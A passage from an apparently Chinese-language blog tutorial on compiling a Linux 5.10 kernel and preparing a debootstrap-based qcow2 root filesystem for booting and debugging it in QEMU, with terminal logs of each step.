</span>17:28 debootstrap/<br>drwxrwxr-x <span class="hljs-number"> 81 </span>uubb uubb      <span class="hljs-number"> 4096 </span>12月<span class="hljs-number"> 14 </span><span class="hljs-number"> 2020 </span>Documentation/<br>drwxrwxr-x<span class="hljs-number"> 140 </span>uubb uubb      <span class="hljs-number"> 4096 </span>1月 <span class="hljs-number"> 17 </span>11:19 drivers/<br>drwxrwxr-x <span class="hljs-number"> 79 </span>uubb uubb     <span class="hljs-number"> 12288 </span>1月 <span class="hljs-number"> 17 </span>11:19 fs/<br>-rw-rw-r--  <span class="hljs-number"> 1 </span>uubb uubb        <span class="hljs-number"> 71 </span>12月<span class="hljs-number"> 14 </span><span class="hljs-number"> 2020 </span>.get_maintainer.ignore<br>-rw-rw-r--  <span class="hljs-number"> 1 </span>uubb uubb        <span class="hljs-number"> 62 </span>12月<span class="hljs-number"> 14 </span><span class="hljs-number"> 2020 </span>.gitattributes<br>-rw-rw-r--  <span class="hljs-number"> 1 </span>uubb uubb      <span class="hljs-number"> 1889 </span>12月<span class="hljs-number"> 14 </span><span class="hljs-number"> 2020 </span>.gitignore<br>drwxrwxr-x <span class="hljs-number"> 31 </span>uubb uubb      <span class="hljs-number"> 4096 </span>1月 <span class="hljs-number"> 17 </span>11:32 include/<br>drwxrwxr-x  <span class="hljs-number"> 2 </span>uubb uubb      <span class="hljs-number"> 4096 </span>1月 <span class="hljs-number"> 17 </span>11:19 init/<br>drwxrwxr-x  <span class="hljs-number"> 2 </span>uubb uubb      <span class="hljs-number"> 4096 </span>1月 <span class="hljs-number"> 17 </span>11:19 ipc/<br>-rw-rw-r--  <span class="hljs-number"> 1 </span>uubb uubb      <span class="hljs-number"> 1327 </span>12月<span class="hljs-number"> 14 </span><span class="hljs-number"> 2020 </span>Kbuild<br>-rw-rw-r--  <span class="hljs-number"> 1 </span>uubb uubb       <span class="hljs-number"> 555 </span>12月<span class="hljs-number"> 14 </span><span class="hljs-number"> 2020 </span>Kconfig<br>drwxrwxr-x <span class="hljs-number"> 20 </span>uubb uubb     <span class="hljs-number"> 12288 </span>1月 <span class="hljs-number"> 17 </span>11:19 kernel/<br>drwxrwxr-x <span class="hljs-number"> 21 </span>uubb uubb     <span class="hljs-number"> 20480 </span>1月 <span class="hljs-number"> 17 </span>11:19 lib/<br>drwxrwxr-x  <span class="hljs-number"> 6 </span>uubb uubb      <span class="hljs-number"> 4096 </span>12月<span class="hljs-number"> 14 </span><span class="hljs-number"> 2020 </span>LICENSES/<br>-rw-rw-r--  <span class="hljs-number"> 1 </span>uubb uubb     <span class="hljs-number"> 18204 </span>12月<span class="hljs-number"> 14 </span><span class="hljs-number"> 2020 </span>.mailmap<br>-rw-rw-r--  <span class="hljs-number"> 1 </span>uubb uubb    <span class="hljs-number"> 576680 </span>12月<span class="hljs-number"> 14 </span><span class="hljs-number"> 2020 </span>MAINTAINERS<br>-rw-rw-r--  <span class="hljs-number"> 1 </span>uubb uubb     <span class="hljs-number"> 64379 </span>12月<span class="hljs-number"> 14 </span><span class="hljs-number"> 2020 </span>Makefile<br>drwxrwxr-x  <span class="hljs-number"> 3 </span>uubb uubb     <span class="hljs-number"> 12288 </span>1月 <span class="hljs-number"> 17 </span>11:19 mm/<br>drwxrwxr-x <span class="hljs-number"> 72 </span>uubb uubb      <span class="hljs-number"> 4096 </span>1月 <span class="hljs-number"> 17 </span>11:19 net/<br>-rw-rw-r--  <span class="hljs-number"> 1 </span>uubb uubb       <span class="hljs-number"> 727 </span>12月<span class="hljs-number"> 14 </span><span class="hljs-number"> 2020 </span>README<br>drwxrwxr-x <span class="hljs-number"> 32 </span>uubb uubb      <span class="hljs-number"> 4096 </span>12月<span class="hljs-number"> 14 </span><span class="hljs-number"> 2020 </span>samples/<br>drwxrwxr-x <span class="hljs-number"> 17 </span>uubb uubb      <span class="hljs-number"> 4096 </span>1月 <span class="hljs-number"> 17 </span>11:19 scripts/<br>drwxrwxr-x <span class="hljs-number"> 13 </span>uubb uubb      <span class="hljs-number"> 4096 </span>1月 <span class="hljs-number"> 17 </span>11:19 security/<br>drwxrwxr-x <span class="hljs-number"> 26 </span>uubb uubb      <span class="hljs-number"> 4096 </span>1月 <span class="hljs-number"> 17 </span>11:19 sound/<br>drwxrwxr-x <span class="hljs-number"> 36 </span>uubb uubb      <span class="hljs-number"> 4096 </span>12月<span class="hljs-number"> 14 </span><span class="hljs-number"> 2020 </span>tools/<br>drwxrwxr-x  <span class="hljs-number"> 3 </span>uubb uubb      <span class="hljs-number"> 4096 </span>1月 <span class="hljs-number"> 17 </span>11:19 usr/<br>drwxrwxr-x  <span class="hljs-number"> 4 </span>uubb uubb      <span class="hljs-number"> 4096 </span>1月 <span class="hljs-number"> 17 </span>11:19 virt/<br>-rw-r--r--  <span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 1853030400 </span>1月 <span class="hljs-number"> 16 </span>18:08 xenial-debootstrap.ext2.qcow2<br></code></pre></td></tr></table></figure><h2 id="依赖安装"><a href="#依赖安装" class="headerlink" title="依赖安装"></a>依赖安装</h2><p>sudo apt install -y build-essential flex bison <br>    libssl-dev libelf-dev  libncurses-dev dwarves zstd <br>    gcc make openssl libc6-dev</p><p>make modules_install INSTALL_MOD_PATH&#x3D;debootstrap&#x2F;</p><p>make modules_install INSTALL_MOD_PATH&#x3D;debootstrap&#x2F;</p><h2 id="安装内核"><a href="#安装内核" class="headerlink" title="安装内核"></a>安装内核</h2><p>如果要单独编译</p><blockquote><p>sudo make modules 编译模块<br>sudo make bzImage  编译内核映像文件<br>sudo make mudoles_install  安装模块<br>sudo make install  安装内核</p></blockquote><h3 id="查看内核是否安装"><a href="#查看内核是否安装" class="headerlink" title="查看内核是否安装"></a>查看内核是否安装</h3><p>如果在本机中安装了内核，可以在 &#x2F;boot&#x2F;grub&#x2F;grub.cfg 内看到刚刚新编译的内核选项。可以重启机器。<br><img src="/Linux_Kernel%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95env.assets/2024-01-17%2011-14-41%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"><br>重启，按住F12，进入GRUB, 查看高级选项，可以看到编译的新的内核。</p><p><img src="/Linux_Kernel%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95env.assets/kernel_grub.jpg"><br>可以进入iniramfs 中。</p><h2 id="测试编译的内核能否使用"><a href="#测试编译的内核能否使用" class="headerlink" title="测试编译的内核能否使用"></a>测试编译的内核能否使用</h2><p>如果出现kernel panic 是正常的，因为缺少initramfs 。</p><p><img src="/Linux_Kernel%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95env.assets/2024-01-17%2010-48-41%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs 1c">uubb@uubb-ThinkCentre-M930s-N000 <span class="hljs-symbol">~/k/linux-5.10&gt; </span><br><span class="hljs-symbol">sudo qemu-system-x86_64 -kernel arch/x86_64/boot/bzImage -nographic -append &quot;console=ttyS0&quot; -enable-kvm</span><br><span class="hljs-symbol">[sudo] uubb 的密码： </span><br><span class="hljs-symbol">qemu-system-x86_64</span>: warning: host doesn&#x27;t support requested feature: CPUID.<span class="hljs-number">80000001</span>H:ECX.svm [bit 2]<br>[    0.<span class="hljs-number">000000</span>] Linux version 5.10.0 (uubb@uubb-ThinkCentre-M930s-N000) (gcc (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0, GNU ld (GNU Binutils for Ubuntu) 2.30) #1 SMP Tue Jan 16 16:59:56 CST <span class="hljs-number">2024</span><br>[    0.<span class="hljs-number">000000</span>] Command line: console=ttyS0<br>[    0.<span class="hljs-number">000000</span>] x86/fpu: x87 FPU will use FXSAVE<br>[    0.<span class="hljs-number">000000</span>] BIOS-provided physical RAM map:<br>[    0.<span class="hljs-number">000000</span>] BIOS-e820: [mem 0x<span class="hljs-number">00000000000000</span>00-0x<span class="hljs-number">000000000009</span>fbff] usable<br>[    0.<span class="hljs-number">000000</span>] BIOS-e820: [mem 0x<span class="hljs-number">000000000009</span>fc00-0x<span class="hljs-number">000000000009</span>ffff] reserved<br>[    0.<span class="hljs-number">000000</span>] BIOS-e820: [mem 0x<span class="hljs-number">0000000000</span>0f<span class="hljs-number">0000</span>-0x<span class="hljs-number">0000000000</span>0fffff] reserved<br>[    0.<span class="hljs-number">000000</span>] BIOS-e820: [mem 0x<span class="hljs-number">00000000001000</span>00-0x<span class="hljs-number">0000000007</span>fdffff] usable<br>[    0.<span class="hljs-number">000000</span>] BIOS-e820: [mem 0x<span class="hljs-number">0000000007</span>fe<span class="hljs-number">0000</span>-0x<span class="hljs-number">0000000007</span>ffffff] reserved<br>[    0.<span class="hljs-number">000000</span>] BIOS-e820: [mem 0x<span class="hljs-number">00000000</span>feffc000-0x<span class="hljs-number">00000000</span>feffffff] reserved<br>[    0.<span class="hljs-number">000000</span>] BIOS-e820: [mem 0x<span class="hljs-number">00000000</span>fffc<span class="hljs-number">0000</span>-0x<span class="hljs-number">00000000</span>ffffffff] reserved<br>[    0.<span class="hljs-number">000000</span>] NX (Execute Disable) protection: active<br>[    0.<span class="hljs-number">000000</span>] SMBIOS 2.8 present.<br>[    0.<span class="hljs-number">000000</span>] DMI: QEMU Standard PC (i440FX + PIIX, <span class="hljs-number">1996</span>), BIOS 1.10.2-1ubuntu1 04/01/<span class="hljs-number">2014</span><br>[    0.<span class="hljs-number">000000</span>] tsc: Fast TSC calibration using PIT<br>[    0.<span class="hljs-number">000000</span>] tsc: Detected <span class="hljs-number">2904.31</span>3 MHz processor<br>[    0.<span class="hljs-number">000472</span>] last_pfn = 0x7fe0 max_arch_pfn = 0x<span class="hljs-number">40000000</span>0<br>...<br>[    1.<span class="hljs-number">264167</span>]  kernel_init_freeable+0x1dc/0x1eb<br>[    1.<span class="hljs-number">264432</span>]  ? rest_init+0xb0/0xb0<br>[    1.<span class="hljs-number">264638</span>]  kernel_init+0x5/0x110<br>[    1.<span class="hljs-number">264849</span>]  ret_from_fork+0x22/0x30<br>[    1.<span class="hljs-number">265246</span>] Kernel Offset: disabled<br>[    1.<span class="hljs-number">265484</span>] ---[ end Kernel panic - not syncing: VFS: Unable to mount root fs on unknown-block(0,0) ]---<br><br><br></code></pre></td></tr></table></figure><h2 id="安装Initramfs"><a href="#安装Initramfs" class="headerlink" title="安装Initramfs"></a>安装Initramfs</h2><p>make modules_install INSTALL_MOD_PATH&#x3D;debootstrap&#x2F;</p><p>sudo debootstrap <br>    –include linux-image-generic <br>    xenial <br>    debootstrap <br>    <a href="http://archive.ubuntu.com/ubuntu">http://archive.ubuntu.com/ubuntu</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">debootstrap ： 一个用来建立<span class="hljs-built_in">chroot</span>环境的工具<br><br>uubb@uubb-ThinkCentre-M930s-N000 ~/k/linux-5.10&gt; make modules_install INSTALL_MOD_PATH=debootstrap/<br>  INSTALL drivers/thermal/intel/x86_pkg_temp_thermal.ko<br>  INSTALL fs/efivarfs/efivarfs.ko<br>  INSTALL net/ipv4/netfilter/iptable_nat.ko<br>  INSTALL net/ipv4/netfilter/nf_log_arp.ko<br>  INSTALL net/ipv4/netfilter/nf_log_ipv4.ko<br>  INSTALL net/ipv6/netfilter/nf_log_ipv6.ko<br>  INSTALL net/netfilter/nf_log_common.ko<br>  INSTALL net/netfilter/xt_LOG.ko<br>  INSTALL net/netfilter/xt_MASQUERADE.ko<br>  INSTALL net/netfilter/xt_addrtype.ko<br>  INSTALL net/netfilter/xt_mark.ko<br>  INSTALL net/netfilter/xt_nat.ko<br>  DEPMOD  5.10.0<br></code></pre></td></tr></table></figure><p>执行完之后，源码目录下会多一个debootstrap目录。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs css">uubb<span class="hljs-keyword">@uubb-ThinkCentre-M930s-N000</span> ~/k/linux-<span class="hljs-number">5.10</span>&gt; sudo debootstrap \<br>   --include linux-image-generic \<br>   xenial \<br>   debootstrap \<br>   <span class="hljs-attribute">http</span>://archive.ubuntu.com/ubuntu<br><br><span class="hljs-attribute">I</span>: Retrieving InRelease <br><span class="hljs-attribute">I</span>: Checking Release signature<br><span class="hljs-attribute">I</span>: Valid Release signature (key id <span class="hljs-number">790</span>BC7277767219C42C86F933B4FE6ACC0B21F32)<br><span class="hljs-attribute">I</span>: Retrieving Packages <br><span class="hljs-attribute">I</span>: Validating Packages <br><span class="hljs-attribute">I</span>: Resolving dependencies of required packages...<br><span class="hljs-attribute">I</span>: Resolving dependencies of base packages...<br><span class="hljs-attribute">I</span>: Found additional base <span class="hljs-attribute">dependencies</span>: crda iw libnl-<span class="hljs-number">3</span>-<span class="hljs-number">200</span> libnl-genl-<span class="hljs-number">3</span>-<span class="hljs-number">200</span> linux-firmware linux-image-<span class="hljs-number">4.4</span>.<span class="hljs-number">0</span>-<span class="hljs-number">21</span>-generic linux-image-extra-<span class="hljs-number">4.4</span>.<span class="hljs-number">0</span>-<span class="hljs-number">21</span>-generic wireless-regdb <br><span class="hljs-attribute">I</span>: Checking component main on <span class="hljs-attribute">http</span>://archive.ubuntu.com/ubuntu...<br><span class="hljs-attribute">I</span>: Retrieving adduser <span class="hljs-number">3.113</span>+nmu3ubuntu4<br><span class="hljs-attribute">I</span>: Validating adduser <span class="hljs-number">3.113</span>+nmu3ubuntu4<br><span class="hljs-attribute">I</span>: Retrieving apt <span class="hljs-number">1.2</span>.<span class="hljs-number">10</span>ubuntu1<br><span class="hljs-attribute">I</span>: Validating apt <span class="hljs-number">1.2</span>.<span class="hljs-number">10</span>ubuntu1<br><span class="hljs-attribute">I</span>: Retrieving apt-utils <span class="hljs-number">1.2</span>.<span class="hljs-number">10</span>ubuntu1<br><span class="hljs-attribute">I</span>: Validating apt-utils <span class="hljs-number">1.2</span>.<span class="hljs-number">10</span>ubuntu1<br><span class="hljs-attribute">I</span>: Retrieving base-files <span class="hljs-number">9.4</span>ubuntu4<br><span class="hljs-attribute">I</span>: Validating base-files <span class="hljs-number">9.4</span>ubuntu4<br><span class="hljs-attribute">I</span>: Retrieving base-passwd <span class="hljs-number">3.5</span>.<span class="hljs-number">39</span><br><span class="hljs-attribute">I</span>: Validating base-passwd <span class="hljs-number">3.5</span>.<span class="hljs-number">39</span><br><span class="hljs-attribute">I</span>: Retrieving bash <span class="hljs-number">4.3</span>-<span class="hljs-number">14</span>ubuntu1<br><span class="hljs-attribute">I</span>: Validating bash <span class="hljs-number">4.3</span>-<span class="hljs-number">14</span>ubuntu1<br><span class="hljs-attribute">I</span>: Retrieving bsdutils <span class="hljs-number">1</span>:<span class="hljs-number">2.27</span>.<span class="hljs-number">1</span>-<span class="hljs-number">6</span>ubuntu3<br><span class="hljs-attribute">I</span>: Validating bsdutils <span class="hljs-number">1</span>:<span class="hljs-number">2.27</span>.<span class="hljs-number">1</span>-<span class="hljs-number">6</span>ubuntu3<br><span class="hljs-attribute">I</span>: Retrieving busybox-initramfs <span class="hljs-number">1</span>:<span class="hljs-number">1.22</span>.<span class="hljs-number">0</span>-<span class="hljs-number">15</span>ubuntu1<br><span class="hljs-attribute">I</span>: Validating busybox-initramfs <span class="hljs-number">1</span>:<span class="hljs-number">1.22</span>.<span class="hljs-number">0</span>-<span class="hljs-number">15</span>ubuntu1<br><span class="hljs-attribute">I</span>: Retrieving bzip2 <span class="hljs-number">1.0</span>.<span class="hljs-number">6</span>-<span class="hljs-number">8</span><br><span class="hljs-attribute">I</span>: Validating bzip2 <span class="hljs-number">1.0</span>.<span class="hljs-number">6</span>-<span class="hljs-number">8</span><br><span class="hljs-attribute">I</span>: Retrieving console-setup <span class="hljs-number">1.108</span>ubuntu15<br><span class="hljs-attribute">I</span>: Validating console-setup <span class="hljs-number">1.108</span>ubuntu15<br><span class="hljs-attribute">I</span>: Retrieving console-setup-linux <span class="hljs-number">1.108</span>ubuntu15<br><span class="hljs-attribute">I</span>: Validating console-setup-linux <span class="hljs-number">1.108</span>ubuntu15<br><span class="hljs-attribute">I</span>: Retrieving coreutils <span class="hljs-number">8.25</span>-<span class="hljs-number">2</span>ubuntu2<br><span class="hljs-attribute">I</span>: Validating coreutils <span class="hljs-number">8.25</span>-<span class="hljs-number">2</span>ubuntu2<br>...<br><span class="hljs-attribute">I</span>: Configuring libc-bin...<br><span class="hljs-attribute">I</span>: Configuring systemd...<br><span class="hljs-attribute">I</span>: Configuring initramfs-tools...<br><span class="hljs-attribute">I</span>: Configuring ureadahead...<br><span class="hljs-attribute">I</span>: Configuring resolvconf...<br><span class="hljs-attribute">I</span>: Base system installed successfully.<br></code></pre></td></tr></table></figure><p>然后chroot 进去，创建用户组，挂载服务。</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs tcl">uubb@uubb-ThinkCentre-M930s-N000 ~/k/linux<span class="hljs-number">-5.10</span>&gt; sudo chroot debootstrap<br>root@uubb-ThinkCentre-M930s-N000:/# ls<br>bin   dev  home        lib    media  opt   root  sbin  sys  usr  vmlinuz<br>boot  etc  initrd.img  lib64  mnt    <span class="hljs-keyword">proc</span><span class="hljs-title">  run</span><span class="hljs-title"> srv</span> <span class="hljs-title">  tmp</span> <span class="hljs-title"> var</span><br>root@uubb-ThinkCentre-M930s-N000:/#<span class="hljs-title"> passwd</span> root<span class="hljs-title"></span><br><span class="hljs-title">Enter</span> new<span class="hljs-title"> UNIX</span> password:<span class="hljs-title"> </span><br><span class="hljs-title">Retype</span> new<span class="hljs-title"> UNIX</span> password:<span class="hljs-title"> </span><br><span class="hljs-title">passwd:</span> password<span class="hljs-title"> updated</span> successfully<span class="hljs-title"></span><br><span class="hljs-title">root@uubb-ThinkCentre-M930s-N000:/#</span> <span class="hljs-title"></span><br><span class="hljs-title">root@uubb-ThinkCentre-M930s-N000:/#</span> <span class="hljs-title"></span><br><span class="hljs-title">root@uubb-ThinkCentre-M930s-N000:/#</span> <span class="hljs-title"></span><br><span class="hljs-title">root@uubb-ThinkCentre-M930s-N000:/#</span> /usr/sbin/adduser<span class="hljs-title"> user</span> <span class="hljs-title"></span><br><span class="hljs-title">perl:</span> warning:<span class="hljs-title"> Setting</span> locale<span class="hljs-title"> failed.</span><br>perl:<span class="hljs-title"> warning:</span> Please<span class="hljs-title"> check</span> that<span class="hljs-title"> your</span> locale<span class="hljs-title"> settings:</span><br><span class="hljs-title">LANGUAGE</span> = &quot;zh_CN:zh&quot;,<span class="hljs-title"></span><br><span class="hljs-title">LC_ALL</span> = (unset),<span class="hljs-title"></span><br><span class="hljs-title">LANG</span> = &quot;zh_CN.UTF-8&quot;<span class="hljs-title"></span><br><span class="hljs-title">    are</span> supported<span class="hljs-title"> and</span> installed<span class="hljs-title"> on</span> your<span class="hljs-title"> system.</span><br>perl:<span class="hljs-title"> warning:</span> Falling<span class="hljs-title"> back</span> to<span class="hljs-title"> the</span> standard<span class="hljs-title"> locale</span> (&quot;C&quot;).<span class="hljs-title"></span><br><span class="hljs-title">Adding</span> user `user&#x27; ...<span class="hljs-title"></span><br><span class="hljs-title">Adding</span> new<span class="hljs-title"> group</span> `user&#x27; (1000) ...<span class="hljs-title"></span><br><span class="hljs-title">Adding</span> new<span class="hljs-title"> user</span> `user&#x27; (1000)<span class="hljs-title"> with</span> group `user&#x27; ...<span class="hljs-title"></span><br><span class="hljs-title">Creating</span> home<span class="hljs-title"> directory</span> `/home/user&#x27; ...<span class="hljs-title"></span><br><span class="hljs-title">Copying</span> files<span class="hljs-title"> from</span> `/etc/skel&#x27; ...<span class="hljs-title"></span><br><span class="hljs-title">Enter</span> new<span class="hljs-title"> UNIX</span> password:<span class="hljs-title"> </span><br><span class="hljs-title">Retype</span> new<span class="hljs-title"> UNIX</span> password:<span class="hljs-title"> </span><br><span class="hljs-title">passwd:</span> password<span class="hljs-title"> updated</span> successfully<span class="hljs-title"></span><br><span class="hljs-title">Changing</span> the<span class="hljs-title"> user</span> information<span class="hljs-title"> for</span> user<span class="hljs-title"></span><br><span class="hljs-title">Enter</span> the<span class="hljs-title"> new</span> value,<span class="hljs-title"> or</span> press<span class="hljs-title"> ENTER</span> for<span class="hljs-title"> the</span> default<span class="hljs-title"></span><br><span class="hljs-title">Full</span> Name []:<span class="hljs-title"> </span><br><span class="hljs-title">Room</span> Number []:<span class="hljs-title"> </span><br><span class="hljs-title">Work</span> Phone []:<span class="hljs-title"> </span><br><span class="hljs-title">Home</span> Phone []:<span class="hljs-title"> </span><br><span class="hljs-title">Other</span> []:<span class="hljs-title"> </span><br><span class="hljs-title">Is</span> the<span class="hljs-title"> information</span> correct? [Y/n]<span class="hljs-title"> </span><br><span class="hljs-title"></span><br><span class="hljs-title">root@uubb-ThinkCentre-M930s-N000:/etc#</span> cat &lt;&lt;<span class="hljs-title"> EOF</span> |<span class="hljs-title"> sudo</span> tee &quot;debootstrap/etc/fstab&quot;<br>&gt; /dev/sda /<span class="hljs-title"> ext4</span> errors=remount-ro,acl 0 1<br>&gt;<span class="hljs-title"> EOF</span><br>tee:<span class="hljs-title"> debootstrap/etc/fstab:</span> No<span class="hljs-title"> such</span> file<span class="hljs-title"> or</span> directory<span class="hljs-title"></span><br><span class="hljs-title">root@uubb-ThinkCentre-M930s-N000:/etc#</span> cat<span class="hljs-title"> fstab</span> <br>#<span class="hljs-title"> UNCONFIGURED</span> FSTAB<span class="hljs-title"> FOR</span> BASE<span class="hljs-title"> SYSTEM</span><br>root@uubb-ThinkCentre-M930s-N000:/etc#<span class="hljs-title"> echo</span> &quot;/dev/sda /<span class="hljs-title"> ext4</span> errors=remount-ro,acl 0 1&quot; &gt;&gt;<span class="hljs-title"> fstab</span> <span class="hljs-title"></span><br><span class="hljs-title">root@uubb-ThinkCentre-M930s-N000:/etc#</span> cat<span class="hljs-title"> fstab</span> <br>#<span class="hljs-title"> UNCONFIGURED</span> FSTAB<span class="hljs-title"> FOR</span> BASE<span class="hljs-title"> SYSTEM</span><br>/dev/sda /<span class="hljs-title"> ext4</span> errors=remount-ro,acl 0 1<span class="hljs-title"></span><br><span class="hljs-title"></span><br><span class="hljs-title">root@uubb-ThinkCentre-M930s-N000:/etc#</span> cat &lt;&lt;<span class="hljs-title"> EOF</span> |<span class="hljs-title"> sudo</span> tee<span class="hljs-title"> debootstrap/etc/systemd/system/dhclient.service</span><br>&gt; [Unit]<br>&gt;<span class="hljs-title"> Description=DHCP</span> Client<br>&gt;<span class="hljs-title"> Documentation=man:dhclient(8)</span><br>&gt;<span class="hljs-title"> Wants=network.target</span><br>&gt;<span class="hljs-title"> Before=network.target</span><br>&gt; [Service]<br>&gt;<span class="hljs-title"> Type=forking</span><br>&gt;<span class="hljs-title"> PIDFile=/var/run/dhclient.pid</span><br>&gt;<span class="hljs-title"> ExecStart=/sbin/dhclient</span> -4 -q<br>&gt; [Install]<br>&gt;<span class="hljs-title"> WantedBy=multi-user.target</span><br>&gt;<span class="hljs-title"> EOF</span><br>tee:<span class="hljs-title"> debootstrap/etc/systemd/system/dhclient.service:</span> No<span class="hljs-title"> such</span> file<span class="hljs-title"> or</span> directory<br>[Unit]<span class="hljs-title"></span><br><span class="hljs-title">Description=DHCP</span> Client<span class="hljs-title"></span><br><span class="hljs-title">Documentation=man:dhclient(8)</span><br>Wants=network.target<span class="hljs-title"></span><br><span class="hljs-title">Before=network.target</span><br>[Service]<span class="hljs-title"></span><br><span class="hljs-title">Type=forking</span><br>PIDFile=/var/run/dhclient.pid<span class="hljs-title"></span><br><span class="hljs-title">ExecStart=/sbin/dhclient</span> -4 -q<br>[Install]<span class="hljs-title"></span><br><span class="hljs-title">WantedBy=multi-user.target</span><br>sudo<span class="hljs-title"> ln</span> -sf<span class="hljs-title"> debootstrap/etc/systemd/system/dhclient.service</span> \<span class="hljs-title"></span><br><span class="hljs-title">    debootstrap/etc/systemd/system/multi-user.target.wants/dhclient.service</span><br></code></pre></td></tr></table></figure><p>然后将debootstrap 目录创建为qcow2 镜像，这可时候要知道你的主机是否支持虚拟化，因为我在服务器上搭建的时候，不支持<br>uubb@uubb-ThinkCentre-M930s-N000 ~&#x2F;k&#x2F;linux-5.10&gt; kvm-ok<br>INFO: &#x2F;dev&#x2F;kvm exists<br>KVM acceleration can be used</p><p>创建 qcow2 镜像，有的时候找不到这个命令，这是要下载 libguestfs</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus">sudo virt-make-fs \<br>    <span class="hljs-attr">--format</span> qcow2 \<br>    <span class="hljs-attr">--size</span> +<span class="hljs-number">1</span>G \<br>    <span class="hljs-attr">--type</span> ext2 \<br>    debootstrap \<br>    xenial-debootstrap<span class="hljs-selector-class">.ext2</span><span class="hljs-selector-class">.qcow2</span><br><br>    <br><span class="hljs-selector-attr">[sudo]</span> uubb 的密码： <br>sudo: virt-make-fs：找不到命令<br></code></pre></td></tr></table></figure><p><img src="/Linux_Kernel%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95env.assets/2024-01-17%2014-19-57%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></p><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>使用qemu 将编译的内核跑起来，并且打开gdb调试的选项。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 